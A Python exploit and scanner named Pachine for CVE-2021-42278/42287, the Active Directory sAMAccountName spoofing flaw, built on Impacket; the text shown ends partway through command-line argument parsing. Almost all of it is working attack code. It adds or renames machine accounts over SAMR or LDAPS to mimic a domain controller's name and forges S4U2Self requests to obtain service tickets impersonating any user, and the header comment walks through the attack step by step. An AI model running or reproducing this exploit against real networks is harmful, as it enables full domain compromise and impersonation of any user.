#!/usr/bin/python3
#
# Pachine (CVE-2021-42278)
#
# Authors:
#   @ly4k (https://github.com/ly4k)
#
# Credit:
#   @cube0x0 (https://github.com/cube0x0)
#
# References:
#   - https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html
#
# Description:
#   CVE-2021-42278 exploit and scanner using standard Impacket
#
#   CVE-2021-42278
#   During S4U2Self, the KDC will try to append a '$' to the computer name specified
#   in the TGT, if the computer name is not found.
#   An attacker can create a new machine account with the sAMAccountName set to a domain
#   controller's sAMAccountName - without the '$'.
#   For instance, suppose there is a domain controller with a sAMAccountName set to
#   'DC$'. An attacker would then create a machine account with the sAMAccountName set
#   to 'DC'. The attacker can then request a TGT for the newly created machine account.
#   After the TGT has been issued by the KDC, the attacker can rename the newly created
#   machine account to something different, e.g. JOHNS-PC. The attacker can then perform
#   S4U2Self and request a TGS to itself as any user. Since the machine account with the
#   sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine
#   account by appending a '$', which will then match the domain controller.
#   The KDC will then issue a valid TGS for the domain controller.
#
#   This attack can also target other domain computers, and not just domain
#   controllers.


import argparse
import datetime
import logging
import os
import random
import ssl
import string
import struct
import sys
from binascii import unhexlify

import ldap3
from impacket import version
from impacket.dcerpc.v5 import epm, samr, transport
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants, crypto
from impacket.krb5.asn1 import (
    AP_REQ,
    AS_REP,
    PA_FOR_USER_ENC,
    TGS_REP,
    TGS_REQ,
    Authenticator,
    EncTGSRepPart,
    seq_set,
    seq_set_iter,
)
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import _HMACMD5, Key, _enctype_table
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.krb5.types import KerberosTime, Principal, Ticket
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from impacket.winregistry import hexdump
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from six import b

# Used to compare size of TGT's ticket with and without PAC
SCAN_THRESHOLD = 0.5


class MachineAccount:
    def __init__(self, username, password, domain, options):
        self.options = options
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ""
        self.nthash = ""
        self.hashes = options.hashes
        self.aesKey = options.aesKey
        self.doKerberos = options.k
        self.target = options.dc_host
        self.kdcHost = options.dc_host
        self.computerPassword = options.computer_pass
        self.method = options.method
        self.port = options.port
        self.domainNetbios = options.domain_netbios
        self.targetIp = options.dc_ip
        self.baseDN = options.baseDN
        self.computerGroup = options.computer_group
        self.action = "add"
        self.computerName = self.options.dc_host.split(".")[0]
        self.newComputerName = self.options.computer_name

        if self.newComputerName is None:
            self.newComputerName = self.generateComputerName()

        if self.targetIp is not None:
            self.kdcHost = self.targetIp

        if self.method not in ["SAMR", "LDAPS"]:
            raise ValueError("Unsupported method %s" % self.method)

        if self.doKerberos and options.dc_host is None:
            raise ValueError(
                "Kerberos auth requires DNS name of the target DC. Use -dc-host."
            )

        if self.method == "LDAPS" and "." not in self.domain:
            logging.warning(
                "'%s' doesn't look like a FQDN. Generating baseDN will probably fail."
                % self.domain
            )

        if options.hashes is not None:
            self.lmhash, self.nthash = options.hashes.split(":")

        if self.computerPassword is None:
            self.computerPassword = "".join(
                random.choice(string.ascii_letters + string.digits) for _ in range(32)
            )

        if self.target is None:
            if "." not in self.domain:
                logging.warning(
                    "No DC host set and '%s' doesn't look like a FQDN. DNS resolution of short names will probably fail."
                    % self.domain
                )
            self.target = self.domain

        if self.port is None:
            if self.method == "SAMR":
                self.port = 445
            elif self.method == "LDAPS":
                self.port = 636

        if self.domainNetbios is None:
            self.domainNetbios = self.domain

        if self.method == "LDAPS" and self.baseDN is None:
            # Create the baseDN
            domainParts = self.domain.split(".")
            self.baseDN = ""
            for i in domainParts:
                self.baseDN += "dc=%s," % i
            # Remove last ','
            self.baseDN = self.baseDN[:-1]

        if self.method == "LDAPS" and self.computerGroup is None:
            self.computerGroup = "CN=Computers," + self.baseDN

    def run_samr(self):
        if self.targetIp is not None:
            stringBinding = epm.hept_map(
                self.targetIp, samr.MSRPC_UUID_SAMR, protocol="ncacn_np"
            )
        else:
            stringBinding = epm.hept_map(
                self.target, samr.MSRPC_UUID_SAMR, protocol="ncacn_np"
            )
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.set_dport(self.port)

        if self.targetIp is not None:
            rpctransport.setRemoteHost(self.targetIp)
            rpctransport.setRemoteName(self.target)

        if hasattr(rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(
                self.username,
                self.password,
                self.domain,
                self.lmhash,
                self.nthash,
                self.aesKey,
            )

        rpctransport.set_kerberos(self.doKerberos, self.kdcHost)
        self.doSAMRAdd(rpctransport)

    def run_ldaps(self):
        connectTo = self.target
        if self.targetIp is not None:
            connectTo = self.targetIp
        try:
            user = "%s\\%s" % (self.domain, self.username)
            tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
            try:
                ldapServer = ldap3.Server(
                    connectTo,
                    use_ssl=True,
                    port=self.port,
                    get_info=ldap3.ALL,
                    tls=tls,
                )
                if self.doKerberos:
                    ldapConn = ldap3.Connection(ldapServer)
                    self.LDAP3KerberosLogin(
                        ldapConn,
                        self.username,
                        self.password,
                        self.domain,
                        self.lmhash,
                        self.nthash,
                        self.aesKey,
                        kdcHost=self.kdcHost,
                    )
                elif self.hashes is not None:
                    ldapConn = ldap3.Connection(
                        ldapServer,
                        user=user,
                        password=self.hashes,
                        authentication=ldap3.NTLM,
                    )
                    ldapConn.bind()
                else:
                    ldapConn = ldap3.Connection(
                        ldapServer,
                        user=user,
                        password=self.password,
                        authentication=ldap3.NTLM,
                    )
                    ldapConn.bind()

            except ldap3.core.exceptions.LDAPSocketOpenError:
                # try tlsv1
                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1)
                ldapServer = ldap3.Server(
                    connectTo,
                    use_ssl=True,
                    port=self.port,
                    get_info=ldap3.ALL,
                    tls=tls,
                )
                if self.doKerberos:
                    ldapConn = ldap3.Connection(ldapServer)
                    self.LDAP3KerberosLogin(
                        ldapConn,
                        self.username,
                        self.password,
                        self.domain,
                        self.lmhash,
                        self.nthash,
                        self.aesKey,
                        kdcHost=self.kdcHost,
                    )
                elif self.hashes is not None:
                    ldapConn = ldap3.Connection(
                        ldapServer,
                        user=user,
                        password=self.hashes,
                        authentication=ldap3.NTLM,
                    )
                    ldapConn.bind()
                else:
                    ldapConn = ldap3.Connection(
                        ldapServer,
                        user=user,
                        password=self.password,
                        authentication=ldap3.NTLM,
                    )
                    ldapConn.bind()

            if self.action == "rename":
                if not self.LDAPComputerExists(ldapConn, self.computerName):
                    raise Exception(
                        "Account %s not found in %s!" % (self.computerName, self.baseDN)
                    )

                computer = self.LDAPGetComputer(ldapConn, self.computerName)

                res = ldapConn.modify(
                    computer.entry_dn,
                    {
                        "sAMAccountName": [
                            (
                                ldap3.MODIFY_REPLACE,
                                [
                                    '"{}"'.format(self.newComputerName).encode(
                                        "utf-16-le"
                                    )
                                ],
                            )
                        ]
                    },
                )

                if not res:
                    if (
                        ldapConn.result["result"]
                        == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS
                    ):
                        raise Exception(
                            "User %s doesn't have right to change name for %s!"
                            % (self.username, self.computerName)
                        )
                    else:
                        raise Exception(str(ldapConn.result))
                else:
                    logging.info(
                        "Changed machine account name from %s to %s"
                        % (self.computerName, self.newComputerName)
                    )

            else:
                if self.LDAPComputerExists(ldapConn, self.computerName):
                    logging.info(
                        "Machine account %s already exists. Trying to change password."
                        % self.computerName
                    )
                    computer = self.LDAPGetComputer(ldapConn, self.computerName)

                    res = ldapConn.modify(
                        computer.entry_dn,
                        {
                            "unicodePwd": [
                                (
                                    ldap3.MODIFY_REPLACE,
                                    [
                                        '"{}"'.format(self.computerPassword).encode(
                                            "utf-16-le"
                                        )
                                    ],
                                )
                            ]
                        },
                    )

                    if not res:
                        if (
                            ldapConn.result["result"]
                            == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS
                        ):
                            raise Exception(
                                "User %s doesn't have right to change password for %s!"
                                % (self.username, self.computerName)
                            )
                        else:
                            raise Exception(str(ldapConn.result))
                    else:
                        logging.info("Changed password for %s." % (self.computerName))

                    return

                computerHostname = self.computerName[:-1]
                computerDn = "CN=%s,%s" % (computerHostname, self.computerGroup)

                # Default computer SPNs
                ucd = {
                    "dnsHostName": "%s.%s" % (computerHostname, self.domain),
                    "userAccountControl": 0x1000,
                    "servicePrincipalName": [],
                    "sAMAccountName": self.computerName,
                    "unicodePwd": ('"%s"' % self.computerPassword).encode("utf-16-le"),
                }

                res = ldapConn.add(
                    computerDn,
                    ["top", "person", "organizationalPerson", "user", "computer"],
                    ucd,
                )
                if not res:
                    if (
                        ldapConn.result["result"]
                        == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM
                    ):
                        error_code = int(
                            ldapConn.result["message"].split(":")[0].strip(), 16
                        )
                        if error_code == 0x216D:
                            raise Exception(
                                "User %s machine quota exceeded!" % self.username
                            )
                        else:
                            raise Exception(str(ldapConn.result))
                    elif (
                        ldapConn.result["result"]
                        == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS
                    ):
                        raise Exception(
                            "User %s doesn't have right to create a machine account!"
                            % self.username
                        )
                    else:
                        raise Exception(str(ldapConn.result))
                else:
                    logging.info(
                        "Added machine account %s with password %s."
                        % (self.computerName, self.computerPassword)
                    )
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()

            logging.critical(str(e))

    def LDAPComputerExists(self, connection, computerName):
        connection.search(self.baseDN, "(sAMAccountName=%s)" % computerName)
        return len(connection.entries) == 1

    def LDAPGetComputer(self, connection, computerName):
        connection.search(self.baseDN, "(sAMAccountName=%s)" % computerName)
        return connection.entries[0]

    def LDAP3KerberosLogin(
        self,
        connection,
        user,
        password,
        domain="",
        lmhash="",
        nthash="",
        aesKey="",
        kdcHost=None,
        TGT=None,
        TGS=None,
        useCache=True,
    ):
        from pyasn1.codec.ber import decoder, encoder
        from pyasn1.type.univ import noValue

        """
        logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
        :param string user: username
        :param string password: password for the user
        :param string domain: domain where the account is valid for (required)
        :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
        :param string nthash: NTHASH used to authenticate using hashes (password is not used)
        :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
        :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
        :param struct TGT: If there's a TGT available, send the structure here and it will be used
        :param struct TGS: same for TGS. See smb3.py for the format
        :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
        :return: True, raises an Exception if error.
        """

        if lmhash != "" or nthash != "":
            if len(lmhash) % 2:
                lmhash = "0" + lmhash
            if len(nthash) % 2:
                nthash = "0" + nthash
            try:  # just in case they were converted already
                lmhash = unhexlify(lmhash)
                nthash = unhexlify(nthash)
            except TypeError:
                pass

        # Importing down here so pyasn1 is not required if kerberos is not used.
        import datetime

        from impacket.krb5 import constants
        from impacket.krb5.asn1 import AP_REQ, TGS_REP, Authenticator, seq_set
        from impacket.krb5.ccache import CCache
        from impacket.krb5.kerberosv5 import getKerberosTGS, getKerberosTGT
        from impacket.krb5.types import KerberosTime, Principal, Ticket

        if TGT is not None or TGS is not None:
            useCache = False

        if useCache:
            try:
                ccache = CCache.loadFile(os.getenv("KRB5CCNAME"))
            except Exception as e:
                # No cache present
                print(e)
                pass
            else:
                # retrieve domain information from CCache file if needed
                if domain == "":
                    domain = ccache.principal.realm["data"].decode("utf-8")
                    logging.debug("Domain retrieved from CCache: %s" % domain)

                logging.debug("Using Kerberos Cache: %s" % os.getenv("KRB5CCNAME"))
                principal = "ldap/%s@%s" % (self.target.upper(), domain.upper())

                creds = ccache.getCredential(principal)
                if creds is None:
                    # Let's try for the TGT and go from there
                    principal = "krbtgt/%s@%s" % (domain.upper(), domain.upper())
                    creds = ccache.getCredential(principal)
                    if creds is not None:
                        TGT = creds.toTGT()
                        logging.debug("Using TGT from cache")
                    else:
                        logging.debug("No valid credentials found in cache")
                else:
                    TGS = creds.toTGS(principal)
                    logging.debug("Using TGS from cache")

                # retrieve user information from CCache file if needed
                if user == "" and creds is not None:
                    user = creds["client"].prettyPrint().split(b"@")[0].decode("utf-8")
                    logging.debug("Username retrieved from CCache: %s" % user)
                elif user == "" and len(ccache.principal.components) > 0:
                    user = ccache.principal.components[0]["data"].decode("utf-8")
                    logging.debug("Username retrieved from CCache: %s" % user)

        # First of all, we need to get a TGT for the user
        userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        if TGT is None:
            if TGS is None:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    userName, password, domain, lmhash, nthash, aesKey, kdcHost
                )
        else:
            tgt = TGT["KDC_REP"]
            cipher = TGT["cipher"]
            sessionKey = TGT["sessionKey"]

        if TGS is None:
            serverName = Principal(
                "ldap/%s" % self.target,
                type=constants.PrincipalNameType.NT_SRV_INST.value,
            )
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                serverName, domain, kdcHost, tgt, cipher, sessionKey
            )
        else:
            tgs = TGS["KDC_REP"]
            cipher = TGS["cipher"]
            sessionKey = TGS["sessionKey"]

            # Let's build a NegTokenInit with a Kerberos REQ_AP

        blob = SPNEGO_NegTokenInit()

        # Kerberos
        blob["MechTypes"] = [TypesMech["MS KRB5 - Microsoft Kerberos 5"]]

        # Let's extract the ticket from the TGS
        tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(tgs["ticket"])

        # Now let's build the AP_REQ
        apReq = AP_REQ()
        apReq["pvno"] = 5
        apReq["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = []
        apReq["ap-options"] = constants.encodeFlags(opts)
        seq_set(apReq, "ticket", ticket.to_asn1)

        authenticator = Authenticator()
        authenticator["authenticator-vno"] = 5
        authenticator["crealm"] = domain
        seq_set(authenticator, "cname", userName.components_to_asn1)
        now = datetime.datetime.utcnow()

        authenticator["cusec"] = now.microsecond
        authenticator["ctime"] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 11
        # AP-REQ Authenticator (includes application authenticator
        # subkey), encrypted with the application session key
        # (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(
            sessionKey, 11, encodedAuthenticator, None
        )

        apReq["authenticator"] = noValue
        apReq["authenticator"]["etype"] = cipher.enctype
        apReq["authenticator"]["cipher"] = encryptedEncodedAuthenticator

        blob["MechToken"] = encoder.encode(apReq)

        request = ldap3.operation.bind.bind_operation(
            connection.version, ldap3.SASL, user, None, "GSS-SPNEGO", blob.getData()
        )

        # Done with the Kerberos saga, now let's get into LDAP
        if connection.closed:  # try to open connection if closed
            connection.open(read_server_info=False)

        connection.sasl_in_progress = True
        response = connection.post_send_single_response(
            connection.send("bindRequest", request, None)
        )
        connection.sasl_in_progress = False
        if response[0]["result"] != 0:
            raise Exception(response)

        connection.bound = True

        return True

    def generateComputerName(self):
        return "DESKTOP-" + (
            "".join(
                random.choice(string.ascii_uppercase + string.digits) for _ in range(8)
            )
            + "$"
        )

    def doSAMRAdd(self, rpctransport):
        dce = rpctransport.get_dce_rpc()
        servHandle = None
        domainHandle = None
        userHandle = None
        try:
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            samrConnectResponse = samr.hSamrConnect5(
                dce,
                "\\\\%s\x00" % self.target,
                samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN,
            )
            servHandle = samrConnectResponse["ServerHandle"]

            samrEnumResponse = samr.hSamrEnumerateDomainsInSamServer(dce, servHandle)
            domains = samrEnumResponse["Buffer"]["Buffer"]
            domainsWithoutBuiltin = list(
                filter(lambda x: x["Name"].lower() != "builtin", domains)
            )

            if len(domainsWithoutBuiltin) > 1:
                domain = list(
                    filter(lambda x: x["Name"].lower() == self.domainNetbios, domains)
                )
                if len(domain) != 1:
                    logging.critical(
                        "This server provides multiple domains and '%s' isn't one of them.",
                        self.domainNetbios,
                    )
                    logging.critical("Available domain(s):")
                    for domain in domains:
                        logging.error(" * %s" % domain["Name"])
                    logging.critical(
                        "Consider using -domain-netbios argument to specify which one you meant."
                    )
                    raise Exception()
                else:
                    selectedDomain = domain[0]["Name"]
            else:
                selectedDomain = domainsWithoutBuiltin[0]["Name"]

            samrLookupDomainResponse = samr.hSamrLookupDomainInSamServer(
                dce, servHandle, selectedDomain
            )
            domainSID = samrLookupDomainResponse["DomainId"]

            if logging.getLogger().level == logging.DEBUG:
                logging.info("Opening domain %s..." % selectedDomain)
            samrOpenDomainResponse = samr.hSamrOpenDomain(
                dce, servHandle, samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER, domainSID
            )
            domainHandle = samrOpenDomainResponse["DomainHandle"]

            if self.action == "rename":
                try:
                    checkForUser = samr.hSamrLookupNamesInDomain(
                        dce, domainHandle, [self.computerName]
                    )
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xC0000073:
                        raise Exception(
                            "Account %s not found in domain %s!"
                            % (self.computerName, selectedDomain)
                        )
                    else:
                        raise

                userRID = checkForUser["RelativeIds"]["Element"][0]
                try:
                    openUser = samr.hSamrOpenUser(
                        dce, domainHandle, samr.USER_WRITE_ACCOUNT, userRID
                    )
                    userHandle = openUser["UserHandle"]
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xC0000022:
                        raise Exception(
                            "User %s doesn't have right to change name for %s!"
                            % (self.username, self.computerName)
                        )
                    else:
                        raise

                req = samr.SAMPR_USER_INFO_BUFFER()
                req["tag"] = samr.USER_INFORMATION_CLASS.UserAccountNameInformation
                req["AccountName"]["UserName"] = self.newComputerName
                samr.hSamrSetInformationUser2(dce, userHandle, req)

                logging.info(
                    "Changed machine account name from %s to %s"
                    % (self.computerName, self.newComputerName)
                )

                return
            else:
                if self.computerName is not None:
                    try:
                        checkForUser = samr.hSamrLookupNamesInDomain(
                            dce, domainHandle, [self.computerName]
                        )
                        logging.info(
                            "Machine account %s already exists. Trying to change password."
                            % self.computerName
                        )

                        userRID = checkForUser["RelativeIds"]["Element"][0]
                        try:
                            openUser = samr.hSamrOpenUser(
                                dce,
                                domainHandle,
                                samr.USER_FORCE_PASSWORD_CHANGE,
                                userRID,
                            )
                            userHandle = openUser["UserHandle"]
                        except samr.DCERPCSessionError as e:
                            if e.error_code == 0xC0000022:
                                raise Exception(
                                    "User %s doesn't have right to change password for %s!"
                                    % (self.username, self.computerName)
                                )
                            else:
                                raise
                        samr.hSamrSetPasswordInternal4New(
                            dce, userHandle, self.computerPassword
                        )
                        logging.info(
                            "Changed password of %s to %s."
                            % (self.computerName, self.computerPassword)
                        )
                        return
                    except samr.DCERPCSessionError as e:
                        if e.error_code != 0xC0000073:
                            raise
                else:
                    foundUnused = False
                    while not foundUnused:
                        self.computerName = self.generateComputerName()
                        try:
                            checkForUser = samr.hSamrLookupNamesInDomain(
                                dce, domainHandle, [self.computerName]
                            )
                        except samr.DCERPCSessionError as e:
                            if e.error_code == 0xC0000073:
                                foundUnused = True
                            else:
                                raise

                try:
                    createUser = samr.hSamrCreateUser2InDomain(
                        dce,
                        domainHandle,
                        self.computerName,
                        samr.USER_WORKSTATION_TRUST_ACCOUNT,
                        samr.USER_FORCE_PASSWORD_CHANGE,
                    )
                except samr.DCERPCSessionError as e:
                    if e.error_code == 0xC0000022:
                        raise Exception(
                            "User %s doesn't have right to create a machine account!"
                            % self.username
                        )
                    elif e.error_code == 0xC00002E7:
                        raise Exception(
                            "User %s machine quota exceeded!" % self.username
                        )
                    else:
                        raise

                userHandle = createUser["UserHandle"]

            samr.hSamrSetPasswordInternal4New(dce, userHandle, self.computerPassword)

            checkForUser = samr.hSamrLookupNamesInDomain(
                dce, domainHandle, [self.computerName]
            )
            userRID = checkForUser["RelativeIds"]["Element"][0]
            openUser = samr.hSamrOpenUser(
                dce, domainHandle, samr.MAXIMUM_ALLOWED, userRID
            )
            userHandle = openUser["UserHandle"]
            req = samr.SAMPR_USER_INFO_BUFFER()
            req["tag"] = samr.USER_INFORMATION_CLASS.UserControlInformation
            req["Control"]["UserAccountControl"] = samr.USER_WORKSTATION_TRUST_ACCOUNT
            samr.hSamrSetInformationUser2(dce, userHandle, req)
            logging.info(
                "Added machine account %s with password %s."
                % (self.computerName, self.computerPassword)
            )

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()

            logging.critical(str(e))
        finally:
            if userHandle is not None:
                samr.hSamrCloseHandle(dce, userHandle)
            if domainHandle is not None:
                samr.hSamrCloseHandle(dce, domainHandle)
            if servHandle is not None:
                samr.hSamrCloseHandle(dce, servHandle)
            dce.disconnect()

    def rename(self):
        self.action = "rename"
        self.run()

    def add(self):
        self.action = "add"
        self.run()

    def run(self):
        if self.method == "SAMR":
            self.run_samr()
        elif self.method == "LDAPS":
            self.run_ldaps()


def saveTicket(ticket, sessionKey, fileName):
    logging.info("Saving ticket in %s" % (fileName + ".ccache"))
    ccache = CCache()

    ccache.fromTGS(ticket, sessionKey, sessionKey)
    ccache.saveFile(fileName + ".ccache")


def S4U2Self(tgt, user, domain, spn, impersonate, cipher, sessionKey, kdcHost):
    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    # Extract the ticket from the TGT
    ticket = Ticket()
    ticket.from_asn1(decodedTGT["ticket"])

    apReq = AP_REQ()
    apReq["pvno"] = 5
    apReq["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)

    opts = list()
    apReq["ap-options"] = constants.encodeFlags(opts)
    seq_set(apReq, "ticket", ticket.to_asn1)

    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = str(decodedTGT["crealm"])

    clientName = Principal()
    clientName.from_asn1(decodedTGT, "crealm", "cname")

    seq_set(authenticator, "cname", clientName.components_to_asn1)

    now = datetime.datetime.utcnow()
    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)

    if logging.getLogger().level == logging.DEBUG:
        logging.debug("AUTHENTICATOR")
        print(authenticator.prettyPrint())
        print("\n")

    encodedAuthenticator = encoder.encode(authenticator)

    # Key Usage 7
    # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
    # TGS authenticator subkey), encrypted with the TGS session
    # key (Section 5.5.1)
    encryptedEncodedAuthenticator = cipher.encrypt(
        sessionKey, 7, encodedAuthenticator, None
    )

    apReq["authenticator"] = noValue
    apReq["authenticator"]["etype"] = cipher.enctype
    apReq["authenticator"]["cipher"] = encryptedEncodedAuthenticator

    encodedApReq = encoder.encode(apReq)

    tgsReq = TGS_REQ()

    tgsReq["pvno"] = 5
    tgsReq["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

    tgsReq["padata"] = noValue
    tgsReq["padata"][0] = noValue
    tgsReq["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_TGS_REQ.value
    )
    tgsReq["padata"][0]["padata-value"] = encodedApReq

    # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
    # requests a service ticket to itself on behalf of a user. The user is
    # identified to the KDC by the user's name and realm.
    clientName = Principal(
        impersonate,
        type=constants.PrincipalNameType.NT_PRINCIPAL.value,
    )

    S4UByteArray = struct.pack("<I", constants.PrincipalNameType.NT_PRINCIPAL.value)
    S4UByteArray += b(impersonate) + b(domain) + b"Kerberos"

    if logging.getLogger().level == logging.DEBUG:
        logging.debug("S4UByteArray")
        hexdump(S4UByteArray)

    # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
    # with the following three parameters: the session key of the TGT of
    # the service performing the S4U2Self request, the message type value
    # of 17, and the byte array S4UByteArray.
    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

    if logging.getLogger().level == logging.DEBUG:
        logging.debug("CheckSum")
        hexdump(checkSum)

    paForUserEnc = PA_FOR_USER_ENC()
    seq_set(paForUserEnc, "userName", clientName.components_to_asn1)
    paForUserEnc["userRealm"] = domain
    paForUserEnc["cksum"] = noValue
    paForUserEnc["cksum"]["cksumtype"] = int(constants.ChecksumTypes.hmac_md5.value)
    paForUserEnc["cksum"]["checksum"] = checkSum
    paForUserEnc["auth-package"] = "Kerberos"

    if logging.getLogger().level == logging.DEBUG:
        logging.debug("PA_FOR_USER_ENC")
        print(paForUserEnc.prettyPrint())

    encodedPaForUserEnc = encoder.encode(paForUserEnc)

    tgsReq["padata"][1] = noValue
    tgsReq["padata"][1]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_FOR_USER.value
    )
    tgsReq["padata"][1]["padata-value"] = encodedPaForUserEnc

    reqBody = seq_set(tgsReq, "req-body")

    opts = list()
    opts.append(constants.KDCOptions.forwardable.value)
    opts.append(constants.KDCOptions.renewable.value)
    opts.append(constants.KDCOptions.canonicalize.value)

    reqBody["kdc-options"] = constants.encodeFlags(opts)

    serverName = Principal(user, type=constants.PrincipalNameType.NT_UNKNOWN.value)

    seq_set(reqBody, "sname", serverName.components_to_asn1)
    reqBody["realm"] = str(decodedTGT["crealm"])

    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

    reqBody["till"] = KerberosTime.to_asn1(now)
    reqBody["nonce"] = random.getrandbits(31)
    seq_set_iter(
        reqBody,
        "etype",
        (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)),
    )

    if logging.getLogger().level == logging.DEBUG:
        logging.debug("Final TGS")
        print(tgsReq.prettyPrint())

    logging.info("Requesting S4U2self")
    message = encoder.encode(tgsReq)

    r = sendReceive(message, domain, kdcHost)

    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

    client = Principal()
    client.from_asn1(tgs, "crealm", "cname")

    server = Principal()
    server.from_asn1(tgs["ticket"], "realm", "sname")

    logging.info("Got TGS for %s for %s" % (client, server))

    cipherText = tgs["enc-part"]["cipher"]

    cipher = crypto._enctype_table[tgs["enc-part"]["etype"]]

    # Key Usage 8
    # TGS-REP encrypted part (includes application session
    # key), encrypted with the TGS session key (Section 5.4.2)
    plainText = cipher.decrypt(sessionKey, 8, cipherText)

    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

    # Change encrypted part
    server = Principal()
    server.from_asn1(encTGSRepPart, "srealm", "sname")

    old_sname = str(server)

    server.components[0] = spn.split("/")[0]
    server.components.append(spn.split("/")[1])

    logging.info("Changing sname from %s to %s" % (old_sname, server))

    seq_set(encTGSRepPart, "sname", server.components_to_asn1)

    plainText = encoder.encode(encTGSRepPart)
    cipherText = cipher.encrypt(sessionKey, 8, plainText, None)

    tgs["enc-part"]["cipher"] = cipherText

    # Change plaintext part
    server = Principal()
    server.from_asn1(tgs["ticket"], "realm", "sname")
    server.components[0] = spn.split("/")[0]
    server.components.append(spn.split("/")[1])

    seq_set(tgs["ticket"], "sname", server.components_to_asn1)

    r = encoder.encode(tgs)

    if logging.getLogger().level == logging.DEBUG:
        logging.debug("TGS_REP")
        print(tgs.prettyPrint())

    cipherText = tgs["enc-part"]["cipher"]

    # Key Usage 8
    # TGS-REP encrypted part (includes application session
    # key), encrypted with the TGS session key (Section 5.4.2)
    plainText = cipher.decrypt(sessionKey, 8, cipherText)

    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

    newSessionKey = Key(
        encTGSRepPart["key"]["keytype"], encTGSRepPart["key"]["keyvalue"]
    )

    # Creating new cipher based on received keytype
    cipher = _enctype_table[encTGSRepPart["key"]["keytype"]]

    return r, cipher, sessionKey, newSessionKey


def scan(user, password, domain, lmhash, nthash, dc):
    # Checking for CVE-2021-42287. This CVE patched together with CVE-2021-42278

    # Request a TGT without a PAC
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgt, _, _, _ = getKerberosTGT(
        userName,
        password,
        domain,
        lmhash,
        nthash,
        kdcHost=dc,
        requestPAC=False,
    )
    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    no_pac_len = len(decodedTGT["ticket"]["enc-part"]["cipher"])

    # Request a TGT with a PAC
    tgt, _, _, _ = getKerberosTGT(
        userName,
        password,
        domain,
        lmhash,
        nthash,
        kdcHost=dc,
        requestPAC=True,
    )
    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    pac_len = len(decodedTGT["ticket"]["enc-part"]["cipher"])

    # Check if TGT without PAC is smaller than TGT with PAC. If not, the DC included the
    # PAC, which means that the DC is patched for CVE-2021-42287 and therefore most
    # likely also for CVE-2021-42278
    if no_pac_len < pac_len * SCAN_THRESHOLD:
        # Vulnerable
        logging.info("Domain controller %s is most likely vulnerable" % dc)
        return True
    else:
        # Not vulnerable
        logging.warning("Domain controller %s is most likely not vulnerable" % dc)
        return False


if __name__ == "__main__":
    # Init the example's logger theme
    logger.init()
    print((version.BANNER))

    parser = argparse.ArgumentParser(
        add_help=True, description="Pachine - CVE-2021-42278 Scanner & Exploit"
    )

    if (
        sys.version_info.major == 2
        and sys.version_info.minor == 7
        and sys.version_info.micro < 16
    ):  # workaround for https://bugs.python.org/issue11874
        parser.add_argument(
            "account",
            action="store",
            help="[domain/]username[:password] Account used to authenticate to DC.",
        )
    else:
        parser.add_argument(
            "account",
            action="store",
            metavar="[domain/]username[:password]",
            help="Account used to authenticate to DC.",
        )

